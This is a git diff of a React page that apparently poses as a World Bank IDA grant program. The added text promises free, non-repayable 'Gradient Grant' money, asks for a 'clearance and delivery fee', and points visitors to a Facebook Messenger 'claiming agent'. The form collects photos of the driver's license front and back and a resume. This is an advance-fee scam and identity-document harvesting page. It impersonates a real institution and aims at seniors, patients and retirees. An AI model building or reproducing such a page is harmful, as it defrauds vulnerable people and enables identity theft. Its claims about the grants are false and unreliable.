@@ -8,16 +8,46 @@ function App() {
   //   console.log(fileInputRef);
   // };
   return (
-    <div className="bg-image min-h-screen bg-gray-400 backdrop-blur-[2px]  bg-opacity-20">
-      <div className="max-w-screen-xl mx-auto px-6">
-        <div className="w-full p-10 bg-[#C43B80] text-white ">
-          <h1 className="text-4xl mb-6 ">What is IDA?</h1>
+    <div className="bg-image min-h-screen bg-gray-400 backdrop-blur-[2px]  bg-opacity-20 scroll-container">
+      <div className="max-w-screen-xl mx-auto px-6 py-12">
+        <div className="w-full p-10 bg-[#C43B80] text-white mb-4 ">
+          <h1 className="text-6xl mb-4">IDA</h1>
           <p>
-            The International Development Association (IDA) is the part of the
-            World Bank that helps the world’s poorest countries. Established in
-            1960, IDA aims to reduce poverty by providing grants for programs
-            that boost economic growth, reduce inequalities, and improve
-            people’s living conditions.
+            Welcome to the international development association individual
+            grant program, for over 60 years, the World bank’s IDA has worked to
+            reduce poverty and boost economic growth.
+          </p>
+        </div>
+        <div className="w-full p-10 bg-[#C43B80] text-white mb-4">
+          <p>
+            Okay, This Is A Federal Government And Private Grant Foundation
+            Issuing Billions Of Dollars In Gradient Grant Money To Variety Of
+            Groups Each Year. Gradient Grants Are Awarded To Individuals Each
+            And Everyday. Gradient Grant Program Are Not Loans. You Decide How
+            Much You Need As Long As The Amount Is Lawful And You Meet The
+            Foundations And Government Agencies Requirements, The Money Is Yours
+            To Keep And Never Need To Be Repaid. Gradient Grant Money Is
+            Non-Taxable And Interest Free. Gradient Grant Money Does Not Require
+            A Credit Check, Security Deposit Or Co-signer. You As A TAX PAYER
+            Are Entitled To Apply For This money.
+          </p>
+        </div>
+        <div className="w-full p-10 bg-[#C43B80] text-white mb-4">
+          <p>
+            This Program Is Based On Helping PAYING FOR MEDICAL BILLS, BUYING A
+            HOME, SALESMAN STARTING THEIR OWN BUSINESS, GOING TO SCHOOL,
+            TEACHERS, RETIRED TEACHERS, WITH SENIORS OLD AND RETIRED PEOPLE.
+            WHEN LOOKING FOR FINANCIAL ASSISTANCE. Remember That There Are
+            Differences Between GRADIENT GRANTS And LOANS. You Are Required To
+            Pay Back A LOAN Often With INTEREST. You Are Not Required To Pay
+            Back A GRADIENT GRANT. You Only Pay For The CLEARANCE AND DELIVERY
+            FEE. Do You Agree With Our Terms?
+          </p>
+        </div>
+        <div className="w-full p-10 bg-[#C43B80] text-white mb-4">
+          <p>
+            ALL WE HAVE TO DO IS VERIFY YOUR INFORMATION TO SEE IF YOU ARE
+            QUALIFIED FOR THE GRANT,ARE YOU READY?
           </p>
         </div>
         <div>
@@ -208,20 +238,6 @@ function App() {
                 UPLOAD A CLEAR PICTURE OF YOUR DRIVERS LICENSE/STATE ID FRONT
                 AND BACK
               </label>
-              {/* <label
-                htmlFor="fileInput"
-                className="bg-gray-600 border border-white text-white px-10 py-2 rounded-lg cursor-pointer"
-              >
-                Browse files
-              </label>
-              <input
-                type="file"
-                id="fileInput"
-                accept=".jpeg, .jpg, .png, .gif"
-                ref={fileInputRef}
-                className="hidden"
-                onChange={handleFileInputChange}
-              /> */}
               <input
                 className="block  text-sm p-2.5 text-gray-900 border border-gray-300 rounded-lg cursor-pointer bg-gray-50 dark:text-gray-400 focus:outline-none dark:bg-gray-700 dark:border-gray-600 dark:placeholder-gray-400"
                 id="picture"
@@ -238,20 +254,6 @@ function App() {
               >
                 UPLOAD YOUR RESUME
               </label>
-              {/* <label
-                htmlFor="fileInput"
-                className="bg-gray-600 border border-white text-white px-10 py-2 rounded-lg cursor-pointer"
-              >
-                Browse files
-              </label>
-              <input
-                type="file"
-                id="fileInput"
-                accept="'.pdf', '.doc', '.docx'"
-                ref={fileInputRef}
-                className="hidden"
-                onChange={handleFileInputChange}
-              /> */}
               <input
                 className="block  text-sm p-2.5 text-gray-900 border border-gray-300 rounded-lg cursor-pointer bg-gray-50 dark:text-gray-400 focus:outline-none dark:bg-gray-700 dark:border-gray-600 dark:placeholder-gray-400"
                 id="resume"
@@ -268,6 +270,26 @@ function App() {
               Submit
             </button>
           </form>
+          {/* <div className="my-2">
+          <p className="text-white">
+              Will get back to you with the required information. Your
+              information is secure and 100% safe with us.
+            </p>
+          </div> */}
+          <div className="w-full p-10 bg-white text-black mb-4">
+            <p>
+              Will get back to you with the required information. Your
+              information is secure and 100% safe with us.
+            </p>
+          </div>
+          <div className="w-full p-10 bg-white text-black mb-4">
+            <p>
+              Then Kindly send a message to our claiming agent to claim your
+              grant
+            </p>
+            <a className="text-black underline" href="https://m.me/carolyn.henigan.1">https://m.me/carolyn.henigan.1</a>
+          </div>
+          
         </div>
       </div>
     </div>
